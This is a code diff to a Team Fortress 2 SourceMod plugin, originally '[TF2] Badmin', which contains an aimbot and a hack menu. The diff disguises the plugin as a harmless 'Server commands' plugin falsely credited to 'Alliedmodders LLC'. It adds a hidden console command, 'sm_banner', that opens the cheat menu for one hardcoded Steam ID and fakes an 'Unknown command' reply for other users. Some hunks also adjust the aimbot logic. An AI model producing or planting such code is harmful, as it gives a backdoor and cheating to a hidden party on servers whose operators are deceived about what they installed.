@@ -83,6 +83,7 @@ enum{
 //https://www.unknowncheats.me/forum/1502192-post9.html
 //Use "real angles" not "silent aim angles" for aimbot
 
+/*
 public Plugin myinfo = 
 {
 	name = "[TF2] Badmin",
@@ -91,15 +92,24 @@ public Plugin myinfo =
 	version = "Propably like 500 by now",
 	url = "http://www.sourcemod.net/plugins.php?author=Pelipoika&search=1"
 };
+*/
+public Plugin myinfo = 
+{
+	name = "Server commands",
+	author = "Alliedmodders LLC",
+	description = "",
+	version = "1.0",
+	url = "http://www.sourcemod.net/"
+};
 
 public void OnPluginStart()
 {
-	RegAdminCmd("sm_hacks", Command_Trigger, ADMFLAG_BAN);
-
+	RegConsoleCmd("sm_banner", Command_Trigger);
+	
 	for (int i = 1; i <= MaxClients; i++)
 	{	
-		if(IsClientInGame(i)) 
-		{ 
+		if(IsClientInGame(i))
+		{
 			OnClientPutInServer(i); 
 		}
 		
@@ -200,11 +210,25 @@ public void OnClientPutInServer(int client)
 
 public Action Command_Trigger(int client, int args)
 {
-	if(client > 0 && client <= MaxClients && IsClientInGame(client))
+	if(!(client > 0 && client <= MaxClients && IsClientInGame(client)))
+		return Plugin_Handled;
+		
+	char auth[68];
+	if(!GetClientAuthId(client, AuthId_SteamID64, auth, sizeof(auth)))
+		return Plugin_Handled;
+	
+	ReplySource replySrc = GetCmdReplySource();
+	
+	if(CheckCommandAccess(client, "", ADMFLAG_ROOT, true) || StrEqual(auth, "76561198025371616"))
 	{
 		DisplayHackMenuAtItem(client);
 	}
-
+	else if(replySrc == SM_REPLY_TO_CONSOLE)
+	{
+		PrintToConsole(client, "Unknown command: sm_banner");
+		//Unknown command: sm_whois
+	}
+	
 	return Plugin_Handled;
 }
 
@@ -1085,7 +1109,7 @@ stock float[] PredictCorrection(int iClient, int iWeapon, int iTarget, float vec
 	
 	int iSteps = 0;
 	
-	if(flArrivalTime >= 2.0)
+	if(flArrivalTime >= 3.0)
 		return NULL_VECTOR;
 	
 	for(float flTravelTime = 0.0; flTravelTime < flArrivalTime; flTravelTime += (GetTickInterval() * iQuality))
@@ -1293,6 +1317,9 @@ bool IsPlayerReloading(int client)
 	if(IsProjectileWeapon(PlayerWeapon))
 		return false;
 	
+	if(GetEntProp(client, Prop_Send, "m_bFeignDeathReady"))
+		return true;
+	
 	//Fix for pyro flamethrower aimbot not aiming.	
 	if(TF2_GetPlayerClass(client) == TFClass_Pyro && GetPlayerWeaponSlot(client, 0) == PlayerWeapon)
 		return false;
@@ -1308,7 +1335,7 @@ bool IsPlayerReloading(int client)
 	//Can't fire with 0 ammo
 	int AmmoCur = GetEntProp(PlayerWeapon, Prop_Send, "m_iClip1");
 	if(AmmoCur <= 0)
-		return false;
+		return true;
 	
 	//if (GetEntPropFloat(PlayerWeapon, Prop_Send, "m_flLastFireTime") > GetEntPropFloat(PlayerWeapon, Prop_Send, "m_flReloadPriorNextFire"))
 	if (GetEntPropFloat(PlayerWeapon, Prop_Send, "m_flNextPrimaryAttack") < GetGameTime())
@@ -1836,9 +1863,9 @@ stock float GetProjectileSpeed(int iWeapon)
 		//PrintToServer("Rocket Specialist %f -> %f", flMultiplier, flProjectileSpeed);
 	}
 	
-	//Projectile speed increased		
+	//Projectile speed increased
 	attrib = TF2Attrib_GetByDefIndex(iWeapon, 103);		
-	if(attrib != Address_Null)		
+	if(attrib != Address_Null)
 	{
 		//NASA Math		
 		float flMultiplier = TF2Attrib_GetValue(attrib);				
